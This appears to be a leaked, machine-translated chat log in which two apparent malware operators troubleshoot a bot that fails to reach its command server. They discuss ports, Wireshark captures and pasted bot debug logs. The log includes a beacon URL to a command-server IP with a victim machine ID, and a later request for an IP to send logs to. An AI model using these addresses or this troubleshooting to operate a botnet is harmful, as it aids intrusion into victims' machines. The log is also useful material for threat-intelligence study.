+[12/23/221 15:50:10] frank: I see something coming
+[12/23/221 15:50:16] frank: Maybe not the right one, of course.
+[12/23/221 15:50:20] jaime: but there's reception.
+[12/23/221 15:51:11] jaime: There's even dns over https
+[12/23/221 15:51:24] jaime: I need it bad
+[27.12.21 14:49:17] frank: Hi.
+[27.12.21 14:49:26] jaime: Hi!
+[27.12.21 14:51:01] frank: I have such a question.
+Hammer is trying to run his bot on 7, it does not knock.
+Question, can you check if there is an http request for padding from the bot on this system, if it works correctly
+[27.12.21 14:51:44] jaime: You can check with wireshark
+[27.12.21 14:51:54] jaime: Can I put it there?
+[27.12.21 14:52:14] frank: Do you have one machine?
+[27.12.21 14:52:49] jaime: Now we'll agree with Hammer! :)
+[27.12.21 14:53:42] jaime: What port does the bot bang on the gasket?
+[27.12.21 14:54:49] frank: 8082
+[27.12.21 14:55:01] frank: Ah.
+[27.12.21 14:55:20] frank: I can't say exactly, I don't know the build settings.
+[27.12.21 14:55:42] frank: Try 443 or 445
+[27.12.21 14:55:54] frank: 8081 sometimes
+[27.12.21 14:56:07] jaime: Got it!
+[27.12.21 15:57:03] jaime: I see exchange with 2.16.192.110 on port 443
+[12/27/221 16:45:13] frank: Yeah.
+[27.12.21 16:45:52] jaime: Very strange exchange I'd say
+[27.12.21 16:47:04] frank: What kind of exchange?
+[27.12.21 16:47:11] frank: Some of the proxies are down there now.
+[27.12.21 16:47:19] frank: Maybe that's the reason for all these errors.
+[12/27/221 16:47:31] frank: ConnectGet(),185: LastErrorCode 183
+12/27/2021 11:12:14 AM AdmGetFile2(),542: ConnectGet() error 6(10035)
+12/27/2021 11:12:17 AM cmd /5/file/ error
+12/27/2021 11:12:22 AM 00 65.152.201.203:443
+12/27/2021 11:12:22 AM AdmGetFile2(),531: url = https://65.152.201.203:443/nn0001/USER-PC_W617600.f856a686256fc3a41bb824a540163cd6/5/file/
+12/27/2021 11:12:43 AM ConnectGet(),116: isSend =0 LastErrorCode 12029
+[27.12.21 16:47:37] frank: Such?
+[27.12.21 16:47:51] jaime: No, I look in wireshark
+[27.12.21 16:47:56] frank: Ah.
+[27.12.21 16:48:11] jaime: I can only see encrypted tcp
+[27.12.21 16:48:41] jaime: Just all packets go from 2.16.192.110 strictly by 1514 bytes
+[27.12.21 16:49:06] jaime: From this bot goes only ACK
+[27.12.21 16:50:00] jaime: As if tls did not negotiate and does not rise over tcp
+[27.12.21 16:50:46] frank: I'll write it down, but first I have to wait
+[27.12.21 16:51:02] frank: It is not clear because there is no config.
+[27.12.21 16:51:09] frank: Or something else
+[27.12.21 16:51:36] jaime: you need to see bot's log, but can't find it
+[27.12.21 16:51:55] frank: Does he have an id?
+[27.12.21 16:52:10] frank: Let me see what goes on the input of at least one of the admins...
+[27.12.21 16:52:54] jaime: There's a morning log
+[12/27/221 16:53:09] jaime: USER-PC_W617600.f856a686256fc3a41bb824a540163cd6
+[27.12.21 16:53:16] jaime: There is this ID
+[10.02.22 16:54:32] frank: Hi.
+[10.02.22 17:01:25] jaime: Hi!
+[10.02.22 17:01:55] jaime: I need IP where to send log post
+[10.02.22 17:02:14] frank: Need pads auk ip?
+[10.02.22 17:02:23] frank: Now you do not have them?
+[10.02.22 17:02:33] jaime: Yes, one is enough.
+[10.02.22 17:02:54] jaime: 195.39.233.29 this one
+[10.02.22 17:04:06] frank: I see, well, I'll specify and send you skype. Most likely as early as tomorrow.
